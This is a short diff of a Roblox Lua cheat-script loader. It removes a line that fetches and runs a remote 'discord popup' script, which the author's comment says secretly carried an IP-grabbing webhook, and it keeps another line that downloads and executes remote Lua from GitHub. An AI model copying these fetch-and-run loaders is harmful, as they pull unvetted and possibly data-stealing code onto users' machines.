@@ -1,4 +1,5 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/discordpopup/refs/heads/main/discord-popup.lua"))()
+-- removed the discord popup since its made by a skid that added a webhook without my knowledge, and he promotes ip grabbing
+-- and i dont support ip grabbing skids, fuck that. 
 if game.PlaceId == 6816362093 then
 print("hi - test all gears")
   loadstring(game:HttpGet("https://raw.githubusercontent.com/evilionx3/gear-wall-gui/refs/heads/main/testallgears.lua"))()
